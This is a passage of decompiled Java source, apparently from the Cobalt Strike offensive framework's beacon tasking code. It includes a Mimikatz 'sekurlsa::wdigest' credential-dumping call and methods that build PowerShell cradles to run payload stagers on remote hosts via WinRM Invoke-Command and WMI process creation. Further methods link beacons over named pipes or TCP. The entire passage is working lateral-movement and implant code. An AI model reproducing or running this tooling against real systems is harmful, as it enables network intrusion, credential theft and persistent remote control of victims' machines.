      this.MimikatzSmall("sekurlsa::wdigest");
   }

   public void WinRM(String var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var2);

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.WinRM(this.bids[var4], var1, "x86", var3);
      }

   }

   public void WinRM(String var1, String var2, String var3, ScListener var4) {
      byte[] var5 = var4.export(var3);
      String var6 = CommonUtils.bString((new ResourceUtils(this.client)).buildPowerShell(var5, "x64".equals(var3)));
      var6 = "Invoke-Command -ComputerName " + var2 + " -ScriptBlock { " + var6 + " }";
      this.log_task(var1, "Tasked beacon to run " + var4 + " on " + var2 + " via WinRM", "T1028, T1086");
      PowerShellTasks var7 = new PowerShellTasks(this.client, var1);
      String var8 = var7.getScriptCradle(var6);
      var7.runCommand(var8);
   }

   public void WMI(String var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var2);

      for(int var4 = 0; var4 < this.bids.length; ++var4) {
         this.WMI(this.bids[var4], var1, var3);
      }

   }

   public void WMI(String var1, String var2, ScListener var3) {
      PowerShellTasks var4 = new PowerShellTasks(this.client, var1);
      byte[] var5 = var3.getPayloadStager("x86");
      String var6 = CommonUtils.bString((new PowerShellUtils(this.client)).buildPowerShellCommand(var5));
      var6 = "Invoke-WMIMethod win32_process -name create -argumentlist '" + var6 + "' -ComputerName " + var2;
      this.log_task(var1, "Tasked beacon to run " + var3 + " on " + var2 + " via WMI", "T1047, T1086");
      String var7 = var4.getScriptCradle(var6);
      var4.runCommand(var7);
   }

   public void linkToPayloadLocal(ScListener var1) {
      int var2;
      if ("windows/beacon_bind_pipe".equals(var1.getPayload())) {
         this.Pause(1000);

         for(var2 = 0; var2 < this.bids.length; ++var2) {
            this.LinkExplicit(this.bids[var2], var1.getPipeName("."));
         }
      } else if ("windows/beacon_bind_tcp".equals(var1.getPayload())) {
         this.Pause(1000);

         for(var2 = 0; var2 < this.bids.length; ++var2) {
            this.ConnectExplicit(this.bids[var2], "127.0.0.1", var1.getPort());
         }
      }

   }

   public void linkToPayloadRemote(ScListener var1, String var2) {
      if (".".equals(var2)) {
         this.linkToPayloadLocal(var1);
      } else {
         int var3;
         if ("windows/beacon_bind_pipe".equals(var1.getPayload())) {
            this.Pause(1000);

            for(var3 = 0; var3 < this.bids.length; ++var3) {
               this.LinkExplicit(this.bids[var3], var1.getPipeName(var2));
            }
         } else if ("windows/beacon_bind_tcp".equals(var1.getPayload())) {
            this.Pause(1000);

            for(var3 = 0; var3 < this.bids.length; ++var3) {
               this.ConnectExplicit(this.bids[var3], var2, var1.getPort());
            }
         }
      }

   }
}
